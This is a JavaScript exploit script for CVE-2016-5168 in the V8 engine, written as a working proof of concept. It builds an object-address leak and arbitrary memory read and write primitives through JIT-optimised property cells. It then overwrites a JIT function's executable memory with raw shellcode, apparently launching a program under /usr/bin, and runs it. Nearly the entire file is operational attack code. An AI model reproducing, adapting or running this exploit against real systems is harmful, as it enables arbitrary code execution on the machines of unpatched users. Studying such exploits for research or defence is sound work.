/*************************************************************
 * File Name: exp.js
 * 
 * Created on: 2020-02-18 00:09:06
 * Author: raycp
 * 
 * Last Modified: 2020-02-18 00:09:18
 * Description: exp for cve-2016-5168
************************************************************/
const MAX_ITERATIONS = 20000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16);
}

// Garbage collection is required to move objects to a stable position in
// memory (OldSpace) before leaking their addresses.
function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

function gc()
{
    for(let i=0;i<0x10;i++)
    {
        new Array(0x1000000);
    }
}



var n;
var m;
var l;

// global property cell with Set()
function Ctor1()
{
    n = new Set();
}

// global property cell with Map()
function Ctor2()
{
    m = new Map();
}

// global property cell with ArrayBuffer()
function Ctor3()
{
    l = new ArrayBuffer();
}

// overwrite value of null String obj to addr of target obj
function OverwriteStringValueToObjAddr(obj)
{
    n.xyz = 3.4766863919152113e-308; // i2f(0x0019000400007300)
    n.xyz1 = 0;                      // Hash of null String obj
    n.xyz2 = 0x1234;                 // length of null String obj
    n.xyz3 = obj;                    // value of null String obj
}

//use the value of null String obj as a HeapObject, write val to the HeapObject
function UseStringValueAsHeapObject(val)
{
    m.xyz = 3.4766863919152113e-308; // i2f(0x0019000400007300)
    m.xyz1 = 0;
    m.xyz2 = 0x1234;
    m.xyz3 = val;
}

//use the Hash of null String obj as a HeapObject, write val to the HeapObject
function UseHashAsHeapObject(val)
{
    l.xyz = 3.4766863919152113e-308; // i2f(0x0019000400007300)
    l.xyz1 = val;                    // Hash of null String
}


// trigger opt of Ctor1-3
for (let i = 0; i<MAX_ITERATIONS; i++){
    Ctor1();
    Ctor2();
    Ctor3();
}

// trigger opt of OverwriteStringValueToObjAddr, UseStringValueAsHeapObject and UseHashAsHeapObject
for (let i = 0; i<MAX_ITERATIONS; i++) {
    OverwriteStringValueToObjAddr(null);
    UseStringValueAsHeapObject(1.1);
    UseHashAsHeapObject(2.2);
}

// create str to get the value of null String obj
var str = new String(null);

// addr primitive
function addrOf(obj)
{
    Ctor1();
    OverwriteStringValueToObjAddr(obj);
    let addr = str.charCodeAt(0)*0x1+str.charCodeAt(1)*0x100+str.charCodeAt(2)*0x10000+str.charCodeAt(3)*0x1000000+str.charCodeAt(4)*0x100000000+str.charCodeAt(5)*0x10000000000+str.charCodeAt(6)*0x1000000000000+str.charCodeAt(7)*0x100000000000000;
    return addr;
}

// create a jit function
var jit = new Function("var a = 1000000");

var dataBuf = new ArrayBuffer(0x200);
var dataBufAddr = addrOf(dataBuf)-1;
var backingStoreAddr = dataBufAddr + 0x20;
print("[+] dataBuf addr: 0x"+hex(dataBufAddr));
var dataView = new DataView(dataBuf);

// overwrite the backingStore pointer of ArrayBuffer to target value
function OverwriteBackingStore(targetValue)
{
    Ctor1();
    OverwriteStringValueToObjAddr(String(null));
    Ctor2();
    UseStringValueAsHeapObject(i2f(backingStoreAddr-0x8+1));
    Ctor3();
    UseHashAsHeapObject(i2f(targetValue));
}

// aar primitive
function dataViewRead64(addr)
{

    OverwriteBackingStore(addr);

    return f2i(dataView.getFloat64(0, true));
}

// aaw primitive
function dataViewWrite(addr, payload)
{

    OverwriteBackingStore(addr);

    for (let i=0; i<payload.length; i++) {
        dataView.setUint8(i, payload[i]);
    }
    return ;

}

// leak rwx memory here
var jitObjAddr = addrOf(jit)-1;
print("[+] jit obj addr: 0x"+hex(jitObjAddr));
var rwxAddr = dataViewRead64(jitObjAddr+0x38);
print("[+] rwx addr: 0x"+hex(rwxAddr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

//%DebugPrint(jit);
//%SystemBreak();
// write shellcode to jit code
dataViewWrite(rwxAddr, shellcode);

// trigger jit function to run shellcode
jit();


